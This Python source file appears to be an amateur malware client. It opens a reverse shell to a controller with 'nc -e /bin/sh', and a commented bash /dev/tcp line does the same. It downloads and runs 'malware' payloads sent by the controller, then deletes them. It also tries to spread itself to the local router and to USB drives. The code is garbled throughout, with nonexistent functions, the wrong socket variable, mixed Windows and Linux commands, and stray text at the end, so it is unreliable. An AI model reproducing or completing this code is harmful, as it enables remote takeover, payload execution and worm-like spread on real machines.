#import modules

import socket
import threading
import os
import sys
import re
import datetime
import pickle
import subprocess
import tqdm
import shutil

# Set global variables, get ip and port

run = True
regex_string_ip = r'(\d+)\.(\d+)\.(\d+)\.(\d+)'
os.system("ip addr | grep 'inet' | awk '{print $2}' > IP.txt")
with open('IP.txt', 'r') as f:
    text = f.read()
    IP = str.locate(text.split()[1], regex_string_ip)

PORT = 4450
PORT_2 = 4444
result = -1
shellrun = True  # for w/ out netcat

# connect socket, open connection, run command
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP, PORT))
    s.send("Reverse_Shell_Status: 200")
    while run:
        message = s.recv(4096)
        if re.match(regex_string_ip, message[0]):
            check_command = os.system("command -v nc")
            if check_command == 0:
                s.send("Netcat Verified")
                result = os.system("nc.exe {ip}:{port} -e /bin/sh".format(
                    ip=message[0], port=message[1]))
            else:
                s.send("Netcat Invalid")

                w_outnetcat()
                #result = os.system("bash -i >& /dev/tcp/{ip}}/{port}} 0>&1".format(ip=message[0], port = message[1]))
                run = 1
            if result == 0:
                s.send("Terminal Opened: 200")
        else:
            s.close()
            sys.quit()
filetype = ""
counter_of_files = 0
malware_files = []


def w_outnetcat():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s2:
        s2.connect((IP, PORT_2))
        while shellrun:
            message = pickle.dumps(s2.recv(4096))
            if message == "w_outnetcat connection":
                pass
            elif message[0] == "malware":
                filetype = message[1]
            elif message == "close":
                for i in malware_files:
                    if os.walk(i):
                        os.remove(i)
            else:
                with open("malware{}.{}".format(counter_of_files, filetype),
                          "w") as f:
                    f.write(message)
                    malware_files.append("malware{}.{}".format(
                        counter_of_files, filetype))
                    os.system("nohup path_location/{} &".format(
                        "malware{}.{}".format(counter_of_files, filetype)))
                    f.close()


def spreadMalwareNetwork():
    os.system("ipconfig | grep 'Default Gateway' > router.txt")
    with open("router.txt", "r") as f:
        ROUTER_IP = f.read()[1]
        f.close()
        del f

    ROUTER_PORT = "23"  #Going to make this automated later
    SEPARATOR = "<SEPARAtTOR>"
    BUFFER_SIZE = 4096
    filename = "router.py"
    routerCode = ''' hello '''

    f = open(filename, "w")
    f.write(routerCode)
    f.close()

    filesize = os.path.getsize(filename)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s3:
        s3.connect((ROUTER_IP, ROUTER_PORT))
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        progress = tqdm.tqdm(range(filesize),
                             f"Sending {filename}",
                             unit="B",
                             unit_scale=True,
                             unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # file transmitting is done
                    break
                s.sendall(bytes_read)
                progress.update(len(bytes_read))
            s3.close()


# ideas? https://stackoverflow.com/questions/8110310/simple-way-to-query-connected-usb-devices-info-in-python
# Place background process for plugged in devices, add files to them?
# https://fraudwatch.com/5-most-common-ways-malware-can-access-somebodys-network/
#good ideas
#https://cs.lmu.edu/~ray/notes/quineprograms/


def spreadToUSB():
    process = subprocess.Popen(['locate', 'usb'],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    dstUsb = stdout  #F:/

    shutil.copy(src="C:/Test/client2.py", dst=dstUsb)


spreadToUSB()
ZS